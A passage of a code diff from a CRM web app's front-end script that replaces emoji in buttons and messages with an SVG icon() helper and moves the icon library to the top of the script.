+            ? `<button class="btn" style="background:#059669;color:#fff" onclick="activateVaForMatching('${id}');closeModal()">${icon('bolt')} Activate for Matching</button>`
             : `<span style="font-size:13px;color:#059669;font-weight:600">✓ In matching pool since ${new Date(v.activated_at).toLocaleDateString()}</span>`}
           </div>
         </div>
@@ -15160,8 +15217,8 @@ function renderClientIntakesPage(){
         <td style="white-space:nowrap;display:flex;gap:6px;align-items:center">
           <button class="btn btn-sm" onclick="openClientIntakeModal('${c.id}')">View</button>
           ${!isActive
-            ? `<button class="btn btn-sm" style="font-size:11px;background:#059669;color:#fff;border:none" onclick="activateCiForMatching('${c.id}')">⚡ Activate</button>`
-            : `<button class="btn btn-sm" style="font-size:11px;background:var(--accent);color:#fff;border:none" onclick="findMatchesForClient('${c.id}')">🔎 Find Matches</button>`}
+            ? `<button class="btn btn-sm" style="font-size:11px;background:#059669;color:#fff;border:none" onclick="activateCiForMatching('${c.id}')">${icon('bolt')} Activate</button>`
+            : `<button class="btn btn-sm" style="font-size:11px;background:var(--accent);color:#fff;border:none" onclick="findMatchesForClient('${c.id}')">${icon('search')} Find Matches</button>`}
         </td>
       </tr>`;
     }).join('');
@@ -15222,10 +15279,10 @@ function openClientIntakeModal(id){
     </div>
     <div style="border-top:1px solid var(--border);margin-top:12px;padding-top:12px;display:flex;justify-content:flex-end">
       ${!c.activated_at
-        ? `<button class="btn" style="background:#059669;color:#fff" onclick="activateCiForMatching('${id}');closeModal()">⚡ Activate for Matching</button>`
+        ? `<button class="btn" style="background:#059669;color:#fff" onclick="activateCiForMatching('${id}');closeModal()">${icon('bolt')} Activate for Matching</button>`
         : `<div style="display:flex;gap:12px;align-items:center">
             <span style="font-size:13px;color:#059669;font-weight:600">✓ In matching pool since ${new Date(c.activated_at).toLocaleDateString()}</span>
-            <button class="btn" style="background:var(--accent);color:#fff" onclick="closeModal();findMatchesForClient('${id}')">🔎 Find Matches</button>
+            <button class="btn" style="background:var(--accent);color:#fff" onclick="closeModal();findMatchesForClient('${id}')">${icon('search')} Find Matches</button>
           </div>`}
     </div>
   `);
@@ -15334,7 +15391,7 @@ function renderMatchResults(cname, data){
       <button class="modal-close" onclick="closeModal()">✕</button>
     </div>
     <div style="max-height:62vh;overflow-y:auto;padding:4px 2px">
-      ${results.length ? cards : `<div style="padding:36px;text-align:center;color:var(--text2)"><div style="font-size:14px;font-weight:600;margin-bottom:6px">No matches found</div><div style="font-size:12px">Activate at least one VA applicant (⚡ Activate on the VA Applicants page) so it enters the matching pool, then try again.</div></div>`}
+      ${results.length ? cards : `<div style="padding:36px;text-align:center;color:var(--text2)"><div style="font-size:14px;font-weight:600;margin-bottom:6px">No matches found</div><div style="font-size:12px">Activate at least one VA applicant (${icon('bolt')} Activate on the VA Applicants page) so it enters the matching pool, then try again.</div></div>`}
     </div>
   `, true);
 }
@@ -15642,38 +15699,7 @@ function setTheme(name){
 }
 
 // ─── SVG ICON LIBRARY ─────────────────────────────────────────────────────
-// Lightweight set of line icons used to replace emojis in UI chrome (buttons,
-// modal tabs, section headers). All use stroke=currentColor so they inherit
-// the parent's color, and viewBox=0 0 24 24 so they're sized by width/height.
-const ICON_PATHS = {
-  phone:    '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13.5a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.69h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 10.09a16 16 0 0 0 6 6l1.46-1.46a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>',
-  message:  '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>',
-  mail:     '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>',
-  calendar: '<rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>',
-  user:     '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
-  users:    '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/>',
-  tag:      '<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/>',
-  pipeline: '<path d="M2 20h20M5 20V10m4 10V4m4 16v-7m4 7v-3"/>',
-  pencil:   '<path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/>',
-  trash:    '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>',
-  save:     '<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/>',
-  plus:     '<line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>',
-  bolt:     '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
-  clock:    '<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>',
-  target:   '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>',
-  bulb:     '<path d="M9 18h6"/><path d="M10 22h4"/><path d="M12 2a7 7 0 0 0-4 12.7c.6.5 1 1.3 1 2.1V18h6v-1.2c0-.8.4-1.6 1-2.1A7 7 0 0 0 12 2z"/>',
-  check:    '<polyline points="20 6 9 17 4 12"/>',
-  sms:      '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><line x1="8" y1="10" x2="8.01" y2="10"/><line x1="12" y1="10" x2="12.01" y2="10"/><line x1="16" y1="10" x2="16.01" y2="10"/>',
-  webhook:  '<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>',
-  share:    '<circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>',
-  sparkle:  '<path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4-6.2-4.5-6.2 4.5 2.4-7.4L2 9.4h7.6z"/>',
-  list:     '<line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/>'
-};
-function icon(name, size=14){
-  const path = ICON_PATHS[name];
-  if(!path) return '';
-  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0">${path}</svg>`;
-}
+// ICON_PATHS + icon() relocated to the top of the script (see ICON SET block).
 
 // ─── CURRENCY ─────────────────────────────────────────────────────────────
 // Single source of truth for the currency symbol used CRM-wide (deal values,
